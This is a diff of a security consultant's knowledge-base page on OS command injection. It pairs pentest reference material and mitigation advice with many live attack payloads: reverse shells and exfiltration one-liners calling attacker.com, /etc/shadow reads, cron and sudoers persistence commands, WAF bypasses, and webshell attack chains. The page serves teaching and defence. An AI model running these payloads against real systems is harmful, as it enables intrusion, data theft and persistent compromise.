@@ -6,163 +6,595 @@
   <title>Command Injection | Web Security | Saikumar Raju</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-  <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    :root { --primary: #00f5a0; --bg-dark: #0a0c10; --bg-card: #111827; --bg-elevated: #1a1f2e; --text-primary: #e8edf5; --text-secondary: #9ca3af; --border: #1f2937; }
-    body.light { --bg-dark: #f3f4f6; --bg-card: #ffffff; --bg-elevated: #e5e7eb; --text-primary: #111827; --text-secondary: #4b5563; --border: #d1d5db; }
-    body { font-family: 'Inter', sans-serif; background: var(--bg-dark); color: var(--text-primary); line-height: 1.6; transition: all 0.3s ease; }
-    .container { max-width: 1300px; margin: 0 auto; padding: 0 2rem; }
-    .navbar { position: sticky; top: 0; background: var(--bg-dark); border-bottom: 1px solid var(--border); padding: 1rem 0; z-index: 100; backdrop-filter: blur(8px); }
-    .nav-flex { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; }
-    .logo { font-size: 1.5rem; font-weight: 700; text-decoration: none; color: var(--text-primary); }
-    .logo span { color: var(--primary); }
-    .nav-links { display: flex; gap: 2rem; list-style: none; align-items: center; flex-wrap: wrap; }
-    .nav-links a { text-decoration: none; color: var(--text-secondary); font-weight: 500; transition: color 0.2s; }
-    .nav-links a:hover { color: var(--primary); }
-    .theme-toggle { background: var(--bg-elevated); border: none; padding: 0.4rem 1rem; border-radius: 40px; cursor: pointer; color: var(--text-primary); display: flex; align-items: center; gap: 0.5rem; font-family: inherit; }
-    .mobile-menu { display: none; background: none; border: none; color: var(--text-primary); font-size: 1.5rem; cursor: pointer; }
-    .page-header { padding: 6rem 0 2rem; }
-    .breadcrumb { margin-bottom: 1rem; color: var(--text-secondary); font-size: 0.85rem; }
-    .breadcrumb a { color: var(--primary); text-decoration: none; }
-    .page-header h1 { font-size: 2.5rem; font-weight: 700; margin-bottom: 0.5rem; }
-    .severity-badge { display: inline-block; background: rgba(255, 68, 68, 0.2); color: #ff4444; padding: 0.3rem 1rem; border-radius: 40px; font-size: 0.75rem; font-weight: 600; margin-bottom: 1rem; }
-    .content-section { margin: 2rem 0; }
-    .content-section h2 { font-size: 1.5rem; margin: 1.5rem 0 1rem; color: var(--primary); border-left: 3px solid var(--primary); padding-left: 1rem; }
-    .code-block { background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; padding: 1.2rem; margin: 1.5rem 0; overflow-x: auto; font-family: 'Courier New', monospace; font-size: 0.85rem; color: var(--primary); position: relative; }
-    .copy-btn { position: absolute; top: 0.5rem; right: 0.5rem; background: var(--bg-elevated); border: none; padding: 0.2rem 0.5rem; border-radius: 4px; cursor: pointer; color: var(--text-secondary); font-size: 0.7rem; }
-    .copy-btn:hover { color: var(--primary); }
-    .payload-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(400px, 1fr)); gap: 0.8rem; margin: 1rem 0; }
-    .payload-item { background: var(--bg-elevated); border: 1px solid var(--border); border-radius: 0.5rem; padding: 0.7rem; font-family: monospace; font-size: 0.75rem; word-break: break-all; }
-    .vulnerability-box { background: rgba(255, 68, 68, 0.1); border-left: 4px solid #ff4444; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
-    .mitigation-box { background: rgba(0, 245, 160, 0.1); border-left: 4px solid var(--primary); padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
-    .back-link { display: inline-flex; align-items: center; gap: 0.5rem; margin-top: 2rem; color: var(--primary); text-decoration: none; }
-    footer { text-align: center; padding: 2rem; border-top: 1px solid var(--border); color: var(--text-secondary); font-size: 0.8rem; }
-    @media (max-width: 768px) { .container { padding: 0 1rem; } .mobile-menu { display: block; } .nav-links { display: none; width: 100%; flex-direction: column; padding: 1rem 0; gap: 1rem; } .nav-links.show { display: flex; } .page-header h1 { font-size: 1.8rem; } .payload-grid { grid-template-columns: 1fr; } }
-  </style>
+
+  <!-- Shared Core Styles -->
+  <link rel="stylesheet" href="../../core/styles/core.css">
+  <link rel="stylesheet" href="../../core/styles/responsive.css">
 </head>
 <body>
 
-<nav class="navbar">
-  <div class="container nav-flex">
-    <a href="../index.html" class="logo">Saikumar.<span>Raju</span></a>
-    <button class="mobile-menu" id="mobileMenuBtn"><i class="fas fa-bars"></i></button>
-    <ul class="nav-links" id="navLinks">
-      <li><a href="../index.html">Resume</a></li>
-      <li><a href="../knowledge-base.html">Knowledge Base</a></li>
-      <li><a href="../blog.html">Write-ups</a></li>
-      <li><a href="../tools.html">Tools</a></li>
-      <li><a href="../index.html#contact">Contact</a></li>
-      <li><button class="theme-toggle" id="themeToggle"><i class="fas fa-moon"></i> Dark</button></li>
-    </ul>
-  </div>
-</nav>
+<div id="app"></div>
 
-<main>
-  <div class="container">
-    <div class="breadcrumb"><a href="../knowledge-base.html">Knowledge Base</a> / <a href="index.html">Web Security</a> / Command Injection</div>
-    <div class="page-header">
-      <span class="severity-badge"><i class="fas fa-exclamation-triangle"></i> Critical Severity</span>
-      <h1>📌 Command Injection</h1>
-    </div>
-
-    <div class="content-section">
-      <h2>🧠 Description</h2>
-      <p><strong>What is Command Injection?</strong></p>
-      <p>Command injection allows attackers to execute arbitrary operating system commands on the server. This occurs when user input is passed unsanitized to a system shell.</p>
-    </div>
-
-    <div class="content-section">
-      <h2>🎯 Attack Surface</h2>
-      <ul>
-        <li>✅ Ping/Hostname lookup tools</li>
-        <li>✅ File conversion utilities</li>
-        <li>✅ ZIP/TAR archiving features</li>
-        <li>✅ System monitoring endpoints</li>
-      </ul>
-    </div>
-
-    <div class="content-section">
-      <h2>💣 Basic Payloads</h2>
-      <div class="payload-grid">
-        <div class="payload-item">; id</div>
-        <div class="payload-item">| id</div>
-        <div class="payload-item">|| id</div>
-        <div class="payload-item">& id</div>
-        <div class="payload-item">&& id</div>
-        <div class="payload-item">`id`</div>
-        <div class="payload-item">$(id)</div>
-        <div class="payload-item">%0aid</div>
-        <div class="payload-item">%0a id</div>
-      </div>
-
-      <div class="payload-category">🚀 Reverse Shell Payloads</div>
-      <div class="payload-grid">
-        <div class="payload-item">bash -i >& /dev/tcp/attacker.com/4444 0>&1</div>
-        <div class="payload-item">nc -e /bin/sh attacker.com 4444</div>
-        <div class="payload-item">python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'</div>
-        <div class="payload-item">php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'</div>
-      </div>
-
-      <div class="payload-category">📁 File Read Payloads</div>
-      <div class="payload-grid">
-        <div class="payload-item">; cat /etc/passwd</div>
-        <div class="payload-item">| type C:\Windows\win.ini</div>
-        <div class="payload-item">&& cat /etc/shadow</div>
-        <div class="payload-item">`cat /etc/hosts`</div>
-      </div>
-
-      <div class="payload-category">🛡️ WAF Bypass</div>
-      <div class="payload-grid">
-        <div class="payload-item">%0a cat /etc/passwd</div>
-        <div class="payload-item">; c${at} /etc/passwd</div>
-        <div class="payload-item">; c""at /etc/passwd</div>
-        <div class="payload-item">; c'a't /etc/passwd</div>
-        <div class="payload-item">; c"a"t /etc/passwd</div>
-      </div>
-    </div>
-
-    <div class="content-section">
-      <h2>⚙️ Exploitation Steps</h2>
-      <ol>
-        <li>Identify parameter that executes system commands</li>
-        <li>Test with <code>; sleep 5</code> for time delay</li>
-        <li>Confirm with <code>; id</code> and check output</li>
-        <li>Read sensitive files</li>
-        <li>Establish reverse shell</li>
-      </ol>
-    </div>
-
-    <div class="content-section">
-      <h2>🛡️ Mitigation</h2>
-      <div class="mitigation-box">
-        <strong>✅ Avoid system() calls with user input</strong><br>
-        <strong>✅ Use language-native APIs instead of shell</strong><br>
-        <strong>✅ Sanitize and validate input strictly</strong><br>
-        <strong>✅ Use allowlist for allowed commands</strong><br>
-        <strong>✅ Run application with least privilege</strong>
-      </div>
-    </div>
-
-    <div class="content-section">
-      <h2>📚 References</h2>
-      <ul>
-        <li><a href="https://portswigger.net/web-security/os-command-injection" class="reference-link" target="_blank">PortSwigger: OS Command Injection</a></li>
-        <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection" class="reference-link" target="_blank">PayloadsAllTheThings: Command Injection</a></li>
-      </ul>
-    </div>
-
-    <a href="index.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to Web Security</a>
-  </div>
-</main>
-
-<footer><p>Saikumar Raju — Cybersecurity Consultant | Command Injection - Complete Guide</p></footer>
+<script src="../../core/vulnerability-template.js"></script>
+<script src="../../core/payload-database.js"></script>
+<script src="../../core/components.js"></script>
+<script src="../../core/core.js"></script>
 
 <script>
-  const mobileBtn = document.getElementById('mobileMenuBtn');
-  const navLinks = document.getElementById('navLinks');
-  if (mobileBtn) { mobileBtn.addEventListener('click', () => navLinks.classList.toggle('show')); }
-  const themeToggle = document.getElementById('themeToggle'); if (themeToggle) { themeToggle.addEventListener('click', () => { document.body.classList.toggle('light'); const icon = themeToggle.querySelector('i'); if (document.body.classList.contains('light')) { icon.classList.remove('fa-moon'); icon.classList.add('fa-sun'); themeToggle.innerHTML = '<i class="fas fa-sun"></i> Light'; } else { icon.classList.remove('fa-sun'); icon.classList.add('fa-moon'); themeToggle.innerHTML = '<i class="fas fa-moon"></i> Dark'; } }); }
-  function copyCode(btn) { const code = btn.parentElement.querySelector('pre').innerText; navigator.clipboard.writeText(code); btn.innerText = 'Copied!'; setTimeout(() => { btn.innerText = 'Copy'; }, 2000); }
+// Vulnerability Page Data
+const commandInjectionData = {
+  id: 'command-injection',
+  name: 'Command Injection',
+  severity: 'critical',
+  cwes: [78, 77],
+  owasp: ['A06:2021'],
+  description: 'Command injection allows attackers to execute arbitrary operating system commands on the server. This occurs when user input is passed unsanitized to a system shell.',
+  breadcrumb: [
+    { name: 'Knowledge Base', url: '../../knowledge-base.html' },
+    { name: 'Web Security', url: 'index.html' },
+    { name: 'Command Injection' }
+  ],
+  sections: {
+    'description': `
+      <p><strong>What is Command Injection?</strong></p>
+      <p>Command injection vulnerabilities allow attackers to execute arbitrary operating system (OS) commands within the context of the vulnerable application. This occurs when untrusted user input is passed directly to a system shell without proper validation, sanitization, or escaping.</p>
+      <p>The vulnerability typically manifests in features like ping tools, hostname lookups, file archiving utilities, image processing, or any functionality that interacts with the operating system.</p>
+    `,
+    'classification': `
+      <table>
+        <tr><th>Classification</th><th>Details</th></tr>
+        <tr><td><strong>OWASP Top 10</strong></td><td>A06:2021 – Vulnerable and Outdated Components</td></tr>
+        <tr><td><strong>CWE</strong></td><td>CWE-78 (OS Command Injection), CWE-77 (Improper Neutralization of Special Elements)</td></tr>
+        <tr><td><strong>CVSS v3.1</strong></td><td>9.8 Critical</td></tr>
+        <tr><td><strong>Attack Vector</strong></td><td>Network / Local</td></tr>
+        <tr><td><strong>Attack Complexity</strong></td><td>Low</td></tr>
+        <tr><td><strong>Impact</strong></td><td>Complete system compromise (CIA)</td></tr>
+      </table>
+    `,
+    'attack-surface': `
+      <ul>
+        <li><strong>Ping/Hostname Tools</strong> – Applications that ping or resolve hostnames based on user input</li>
+        <li><strong>File Conversion Utilities</strong> – Image resizing, PDF conversion, video encoding</li>
+        <li><strong>ZIP/TAR Archiving</strong> – Archive extraction or creation features</li>
+        <li><strong>System Monitoring Endpoints</strong> – Disk usage, CPU load, network statistics</li>
+        <li><strong>Database Backup/Restore</strong> – mysqldump, pg_dump, or SQL Server backups</li>
+        <li><strong>Report Generation</strong> – PDF or document generation from user-supplied paths</li>
+        <li><strong>DNS/Network Tools</strong> – nslookup, tracert, dig queries</li>
+        <li><strong>Mail Functions</strong> – sendmail with user-controlled parameters</li>
+      </ul>
+    `,
+    'preconditions': `
+      <ul>
+        <li>Application executes system commands (exec, system, popen, subprocess, Runtime.exec, etc.)</li>
+        <li>User input reaches the command execution function without proper sanitization</li>
+        <li>Shell metacharacters are not escaped or filtered</li>
+        <li>Input validation is insufficient (whitelist bypass, encoding tricks)</li>
+        <li>Application runs with elevated privileges</li>
+      </ul>
+    `,
+    'detection': `
+      <h4>Manual Testing Steps:</h4>
+      <ol>
+        <li><strong>Identify Command Injection Points</strong> – Look for parameters that might interact with system commands</li>
+        <li><strong>Test with Time Delays</strong> – Use <code>; sleep 5</code> or <code>| ping -c 5 127.0.0.1</code> to detect timing delays</li>
+        <li><strong>Command Output Reflection</strong> – Test <code>; id</code> or <code>; whoami</code> to check if output is reflected</li>
+        <li><strong>DNS/OOB Exfiltration</strong> – Use <code>; nslookup attacker.com</code> for out-of-band detection</li>
+        <li><strong>Error-Based Detection</strong> – Inject invalid commands to trigger error messages</li>
+      </ol>
+
+      <h4>Burp Suite Detection:</h4>
+      <ul>
+        <li>Use <strong>Scanner</strong> with "OS Command Injection" checks enabled</li>
+        <li>Manual testing via <strong>Repeater</strong> with metacharacter payloads</li>
+        <li>Use <strong>Intruder</strong> to fuzz command separators (;, |, &, etc.)</li>
+      </ul>
+
+      <h4>Automated Tools:</h4>
+      <ul>
+        <li><strong>Nuclei</strong> – Pre-built templates for command injection detection</li>
+        <li><strong>OWASP ZAP</strong> – Active scanner with OS command injection rules</li>
+        <li><strong>Commix</strong> – Specialized command injection scanner</li>
+      </ul>
+    `,
+    'burp-workflow': `
+      <ol>
+        <li><strong>Send to Repeater</strong> – Capture the request in Burp Proxy</li>
+        <li><strong>Identify Parameter</strong> – Locate the parameter that might execute commands (e.g., hostname, filename, URL)</li>
+        <li><strong>Test with Separator</strong> – Append <code>; id</code> and observe the response</li>
+        <li><strong>Verify Output</strong> – If <code>uid=0(root)</code> or similar appears, command injection is confirmed</li>
+        <li><strong>Test Multiple Separators</strong> – Try <code>|</code>, <code>||</code>, <code>&</code>, <code>&&</code>, <code>\`\`</code>, <code>$()</code></li>
+        <li><strong>Blind Detection</strong> – For blind injection, use time delays or DNS callbacks</li>
+        <li><strong>WAF Bypass</strong> – If filters are detected, try encoding or obfuscation tricks</li>
+      </ol>
+    `,
+    'tool-automation': `
+      <h4>Commix (Specialized CLI Tool):</h4>
+      <pre><code>commix --url="http://target.com/ping.php?host=127.0.0.1" --data="host=127.0.0.1"
+commix --url="http://target.com/upload.php" --file-upload</code></pre>
+
+      <h4>sqlmap (Extended for Command Injection):</h4>
+      <pre><code>sqlmap -u "http://target.com/api/ping" --os-cmd="id"
+sqlmap -u "http://target.com/file.php?name=" --os-shell</code></pre>
+
+      <h4>Burp Intruder Payloads:</h4>
+      <pre><code>Payload Type: Simple List
+Payloads: ; id | id || id & id && id \`id\` $(id)</code></pre>
+
+      <h4>OWASP ZAP:</h4>
+      <pre><code>zaproxy -cmd -quickurl http://target.com -quickout report.html</code></pre>
+
+      <h4>Nuclei Template:</h4>
+      <pre><code>nuclei -u http://target.com -t /path/to/os-command-injection.yaml</code></pre>
+    `,
+    'payloads-basic': `
+      <p><strong>Basic Command Separators</strong></p>
+      <div class="payload-grid">
+        <div class="payload-item"><code>; id</code></div>
+        <div class="payload-item"><code>| id</code></div>
+        <div class="payload-item"><code>|| id</code></div>
+        <div class="payload-item"><code>& id</code></div>
+        <div class="payload-item"><code>&& id</code></div>
+        <div class="payload-item"><code>\`id\`</code></div>
+        <div class="payload-item"><code>$(id)</code></div>
+        <div class="payload-item"><code>%0aid</code></div>
+        <div class="payload-item"><code>%0a id</code></div>
+      </div>
+
+      <p style="margin-top: 1.5rem;"><strong>Command Substitution</strong></p>
+      <div class="payload-grid">
+        <div class="payload-item"><code>\`whoami\`</code></div>
+        <div class="payload-item"><code>$(whoami)</code></div>
+        <div class="payload-item"><code>\`uname -a\`</code></div>
+        <div class="payload-item"><code>$(cat /etc/hostname)</code></div>
+      </div>
+    `,
+    'payloads-advanced': `
+      <p><strong>Reverse Shell Payloads</strong></p>
+      <div class="payload-grid">
+        <div class="payload-item"><code>bash -i >& /dev/tcp/attacker.com/4444 0>&1</code></div>
+        <div class="payload-item"><code>nc -e /bin/sh attacker.com 4444</code></div>
+        <div class="payload-item"><code>python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'</code></div>
+        <div class="payload-item"><code>php -r '\$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'</code></div>
+      </div>
+
+      <p style="margin-top: 1.5rem;"><strong>Data Exfiltration Payloads</strong></p>
+      <div class="payload-grid">
+        <div class="payload-item"><code>; cat /etc/passwd | curl -d @- http://attacker.com/exfil</code></div>
+        <div class="payload-item"><code>; cat /etc/shadow | base64 | nslookup \`cat\`.attacker.com</code></div>
+        <div class="payload-item"><code>; wget -O- http://attacker.com/script.sh | bash</code></div>
+      </div>
+
+      <p style="margin-top: 1.5rem;"><strong>Lateral Movement & Privilege Escalation</strong></p>
+      <div class="payload-grid">
+        <div class="payload-item"><code>; sudo -l</code></div>
+        <div class="payload-item"><code>; find / -perm -4000 2>/dev/null</code></div>
+        <div class="payload-item"><code>; cat /proc/version</code></div>
+        <div class="payload-item"><code>; uname -a && whoami</code></div>
+      </div>
+    `,
+    'payloads-context-aware': `
+      <p><strong>WAF Bypass Techniques</strong></p>
+      <div class="payload-grid">
+        <div class="payload-item"><code>%0a cat /etc/passwd</code> – Newline injection</div>
+        <div class="payload-item"><code>; c\${at} /etc/passwd</code> – Variable expansion</div>
+        <div class="payload-item"><code>; c""at /etc/passwd</code> – Empty quote bypass</div>
+        <div class="payload-item"><code>; c'a't /etc/passwd</code> – Quote splitting</div>
+        <div class="payload-item"><code>; c"a"t /etc/passwd</code> – Quote separation</div>
+      </div>
+
+      <p style="margin-top: 1.5rem;"><strong>Windows-Specific Payloads</strong></p>
+      <div class="payload-grid">
+        <div class="payload-item"><code>| type C:\\Windows\\win.ini</code></div>
+        <div class="payload-item"><code>& whoami</code></div>
+        <div class="payload-item"><code>; ipconfig</code></div>
+        <div class="payload-item"><code>&& dir C:\\Users</code></div>
+        <div class="payload-item"><code>| systeminfo</code></div>
+      </div>
+
+      <p style="margin-top: 1.5rem;"><strong>Encoding & Obfuscation</strong></p>
+      <div class="payload-grid">
+        <div class="payload-item"><code>; echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash</code> – Base64 encoding</div>
+        <div class="payload-item"><code>; echo \$(printf '\\x63\\x61\\x74') /etc/passwd</code> – Hex encoding</div>
+        <div class="payload-item"><code>; $(printf '\x63\x61\x74') /etc/passwd</code> – Octal encoding</div>
+      </div>
+    `,
+    'poc': `
+      <h4>Python PoC:</h4>
+      <pre><code class="language-python">import requests
+
+url = "http://target.com/ping.php"
+payloads = [
+    {"host": "127.0.0.1; id"},
+    {"host": "127.0.0.1 | id"},
+    {"host": "127.0.0.1 && id"}
+]
+
+for payload in payloads:
+    response = requests.get(url, params=payload)
+    if "uid=" in response.text:
+        print(f"[+] Command injection found: {payload}")
+        break</code></pre>
+
+      <h4>Bash PoC:</h4>
+      <pre><code class="language-bash">#!/bin/bash
+TARGET="http://target.com/ping.php"
+SEPARATORS=(';' '|' '||' '&' '&&' '\`' '$()' '%0a')
+
+for sep in "${SEPARATORS[@]}"; do
+    curl "${TARGET}?host=127.0.0.1${sep}id"
+    echo "[*] Tested: ${sep}"
+done</code></pre>
+    `,
+    'request-response': `
+      <h4>Vulnerable Request (Command Injection):</h4>
+      <pre><code>GET /ping.php?host=127.0.0.1;id HTTP/1.1
+Host: target.com
+Connection: close</code></pre>
+
+      <h4>Vulnerable Response:</h4>
+      <pre><code>HTTP/1.1 200 OK
+Content-Type: text/html
+
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.234 ms</code></pre>
+
+      <h4>Secure Request (Input Validation):</h4>
+      <pre><code>GET /ping.php?host=127.0.0.1 HTTP/1.1
+Host: target.com
+Connection: close</code></pre>
+
+      <h4>Secure Response:</h4>
+      <pre><code>HTTP/1.1 200 OK
+Content-Type: text/html
+
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.234 ms
+64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.156 ms</code></pre>
+    `,
+    'impact': `
+      <ul>
+        <li><strong>Remote Code Execution (RCE)</strong> – Complete system compromise</li>
+        <li><strong>Data Breach</strong> – Access to sensitive files (/etc/passwd, /etc/shadow, databases)</li>
+        <li><strong>Lateral Movement</strong> – Pivot to internal systems and escalate privileges</li>
+        <li><strong>Malware Deployment</strong> – Download and execute malicious scripts</li>
+        <li><strong>Denial of Service (DoS)</strong> – Resource exhaustion or system shutdown</li>
+        <li><strong>Cryptomining</strong> – Abuse computational resources</li>
+        <li><strong>Supply Chain Attacks</strong> – Compromise build systems and pipelines</li>
+      </ul>
+    `,
+    'advanced-exploitation': `
+      <h4>Blind Command Injection (Time-Based Detection):</h4>
+      <pre><code>Parameter: ping
+Payload: 127.0.0.1; sleep 10
+Detection: If response takes 10+ seconds, injection is likely blind</code></pre>
+
+      <h4>Out-of-Band (OOB) Exfiltration:</h4>
+      <pre><code>; nslookup \$(whoami).attacker.com
+; curl http://attacker.com/\$(whoami)
+; wget http://attacker.com/shell.sh -O /tmp/s.sh && bash /tmp/s.sh</code></pre>
+
+      <h4>Privilege Escalation via Sudo:</h4>
+      <pre><code>; sudo -l  # Enumerate sudoers
+; sudo /usr/bin/find / -exec /bin/sh \; # Shell escape
+; sudo /usr/bin/nmap --interactive  # Interactive mode</code></pre>
+
+      <h4>Persistence Mechanisms:</h4>
+      <pre><code>; echo "attacker ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
+; crontab -e  # Add reverse shell to cron
+; (crontab -l; echo "* * * * * /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1") | crontab -</code></pre>
+    `,
+    'attack-chains': `
+      <h4>Chain 1: Command Injection → File Upload → RCE</h4>
+      <ol>
+        <li>Identify command injection in file conversion feature</li>
+        <li>Execute: <code>; curl http://attacker.com/shell.php -o /var/www/html/shell.php</code></li>
+        <li>Access uploaded shell: <code>http://target.com/shell.php</code></li>
+        <li>Achieve RCE with interactive webshell</li>
+      </ol>
+
+      <h4>Chain 2: Command Injection → Database Credentials → SQL Injection</h4>
+      <ol>
+        <li>Extract environment variables: <code>; env | grep DB</code></li>
+        <li>Capture database credentials</li>
+        <li>Use credentials for direct database compromise</li>
+      </ol>
+
+      <h4>Chain 3: Command Injection → Private Key Theft → SSH Access</h4>
+      <ol>
+        <li>Read SSH private keys: <code>; cat ~/.ssh/id_rsa</code></li>
+        <li>Use keys for lateral movement to other systems</li>
+        <li>Establish persistent access</li>
+      </ol>
+    `,
+    'test-cases': `
+      <table>
+        <tr><th>Test Case</th><th>Payload</th><th>Expected Result</th><th>Pass/Fail</th></tr>
+        <tr><td>Basic Separator Test</td><td>; id</td><td>uid/gid output visible</td><td></td></tr>
+        <tr><td>Pipe Test</td><td>| whoami</td><td>Username output visible</td><td></td></tr>
+        <tr><td>Conditional AND</td><td>&& cat /etc/hostname</td><td>Hostname output visible</td><td></td></tr>
+        <tr><td>Command Substitution</td><td>\`id\`</td><td>uid/gid output visible</td><td></td></tr>
+        <tr><td>Time-Based Blind</td><td>; sleep 5</td><td>Response delayed 5+ seconds</td><td></td></tr>
+        <tr><td>DNS OOB</td><td>; nslookup attacker.com</td><td>DNS query logged at attacker</td><td></td></tr>
+        <tr><td>WAF Bypass - Variable</td><td>; c\${at} /etc/passwd</td><td>File contents visible</td><td></td></tr>
+        <tr><td>WAF Bypass - Quote</td><td>; c""at /etc/passwd</td><td>File contents visible</td><td></td></tr>
+      </table>
+    `,
+    'mitigation': `
+      <h4>Input Validation & Sanitization</h4>
+      <ul>
+        <li><strong>Whitelist Approach:</strong> Only allow alphanumeric and specific safe characters</li>
+        <li><strong>Regular Expressions:</strong> Enforce strict format matching (e.g., IP addresses, domain names)</li>
+        <li><strong>Length Limits:</strong> Restrict input length to prevent buffer overflow tricks</li>
+        <li><strong>Encoding:</strong> Properly escape shell metacharacters</li>
+      </ul>
+
+      <h4>Safe APIs (Preferred)</h4>
+      <pre><code class="language-python"># ❌ Vulnerable: Using system()
+import os
+os.system(f"ping {user_input}")
+
+# ✅ Secure: Using subprocess with argument list
+import subprocess
+subprocess.run(["ping", "-c", "1", user_input], check=True)</code></pre>
+
+      <pre><code class="language-php">// ❌ Vulnerable
+exec("ping " . $_GET['host']);
+
+// ✅ Secure
+$output = shell_exec("ping -c 1 " . escapeshellarg($_GET['host']));</code></pre>
+
+      <pre><code class="language-nodejs">// ❌ Vulnerable
+exec(\`ping \${userInput}\`, callback);
+
+// ✅ Secure
+execFile("ping", ["-c", "1", userInput], callback);</code></pre>
+
+      <h4>Principle of Least Privilege</h4>
+      <ul>
+        <li>Run application with minimal required permissions</li>
+        <li>Avoid running web server as root</li>
+        <li>Use AppArmor, SELinux, or similar for process isolation</li>
+      </ul>
+    `,
+    'advanced-mitigation': `
+      <h4>Defense in Depth</h4>
+      <ul>
+        <li><strong>Sandboxing:</strong> Run commands in isolated containers (Docker, chroot jails)</li>
+        <li><strong>Mandatory Access Control (MAC):</strong> Use AppArmor or SELinux to restrict command execution</li>
+        <li><strong>WAF Rules:</strong> Block payloads with command separators (;, |, &, etc.)</li>
+        <li><strong>Input Validation:</strong> Strict whitelisting at application level</li>
+        <li><strong>Output Encoding:</strong> Properly escape any command output before displaying</li>
+      </ul>
+
+      <h4>Framework-Specific Recommendations</h4>
+      <pre><code class="language-python"># Django: Use subprocess with list arguments
+from subprocess import run
+run(["ping", "-c", "1", validated_input])</code></pre>
+
+      <pre><code class="language-java">// Java: Avoid Runtime.exec() with shell=true
+ProcessBuilder pb = new ProcessBuilder("ping", "-c", "1", userInput);
+pb.start();</code></pre>
+
+      <h4>Logging & Monitoring</h4>
+      <ul>
+        <li>Log all command execution attempts with user context</li>
+        <li>Alert on suspicious patterns (multiple command separators, unusual commands)</li>
+        <li>Monitor for process spawning from web application user</li>
+        <li>Track failed command attempts</li>
+      </ul>
+    `,
+    'monitoring-detection': `
+      <h4>WAF Rules (ModSecurity)</h4>
+      <pre><code>SecRule ARGS "@rx (?:[;&|'\`]|%0[ad]|\\r\\n)" \
+    "id:1000,phase:2,deny,log,msg:'OS Command Injection Attempt'"
+
+SecRule ARGS "@rx \\b(?:cat|chmod|chown|curl|exec|find|grep|nc|ncat|ping|wget|whoami|id)\\b" \
+    "id:1001,phase:2,chain,msg:'Suspicious Command Detected'"
+    SecRule ARGS "@rx [;&|'\`]"</code></pre>
+
+      <h4>IDS/IPS Signatures (Suricata)</h4>
+      <pre><code>alert http any any -> any any (
+    msg:"OS Command Injection Attempt";
+    content:"GET"; http_method;
+    pcre:"/[;&|'\`%0ad]/";
+    sid:200001;
+)</code></pre>
+
+      <h4>Log Analysis Patterns</h4>
+      <ul>
+        <li>Look for command separators in HTTP parameters: <code>; | & || && \` $()</code></li>
+        <li>Detect multiple command attempts in single request</li>
+        <li>Monitor for sensitive command keywords: <code>cat, chmod, curl, nc, wget</code></li>
+        <li>Track unusual process spawning from web application users</li>
+      </ul>
+
+      <h4>SIEM Detection Queries</h4>
+      <pre><code>source="web_server" (field=parameter OR field=body OR field=header)
+| regex "(\;|\||\&|\&\&|\\||\\\\\\`|\\$\\()"
+| stats count by source_ip, user_agent</code></pre>
+    `,
+    'security-controls': `
+      <table>
+        <tr><th>Control</th><th>Type</th><th>Effectiveness</th></tr>
+        <tr><td>Input Validation (Whitelist)</td><td>Preventive</td><td>★★★★★ Very High</td></tr>
+        <tr><td>Safe APIs (subprocess with args list)</td><td>Preventive</td><td>★★★★★ Very High</td></tr>
+        <tr><td>Least Privilege (Non-root execution)</td><td>Preventive</td><td>★★★★☆ High</td></tr>
+        <tr><td>Container Sandboxing</td><td>Preventive</td><td>★★★★☆ High</td></tr>
+        <tr><td>WAF Rules</td><td>Detective</td><td>★★★☆☆ Medium (Can be bypassed)</td></tr>
+        <tr><td>Process Isolation (AppArmor/SELinux)</td><td>Preventive</td><td>★★★★☆ High</td></tr>
+        <tr><td>Logging & Monitoring</td><td>Detective</td><td>★★★★☆ High</td></tr>
+        <tr><td>Security Awareness Training</td><td>Preventive</td><td>★★★☆☆ Medium</td></tr>
+      </table>
+    `,
+    'bypass-techniques': `
+      <h4>Quote & Variable Expansion Bypasses</h4>
+      <div class="payload-grid">
+        <div class="payload-item"><code>c\${at}</code> – Variable expansion</div>
+        <div class="payload-item"><code>c'a't</code> – Quote splitting (bash concatenation)</div>
+        <div class="payload-item"><code>c"a"t</code> – Quoted concatenation</div>
+        <div class="payload-item"><code>c\a\t</code> – Backslash escaping</div>
+      </div>
+
+      <h4>Encoding Bypasses</h4>
+      <div class="payload-grid">
+        <div class="payload-item"><code>%0a cat /etc/passwd</code> – Newline injection</div>
+        <div class="payload-item"><code>echo 636174 | xxd -r -p</code> – Hex decoding</div>
+        <div class="payload-item"><code>echo Y2F0 | base64 -d</code> – Base64 decoding</div>
+        <div class="payload-item"><code>printf '\\x63\\x61\\x74'</code> – Hex escape</div>
+      </div>
+
+      <h4>Null Byte & Command Truncation</h4>
+      <div class="payload-grid">
+        <div class="payload-item"><code>ping%00;id</code> – Null byte injection (older PHP)</div>
+        <div class="payload-item"><code>ping\x00;id</code> – Binary null terminator</div>
+      </div>
+
+      <h4>Whitespace & Comment Bypasses</h4>
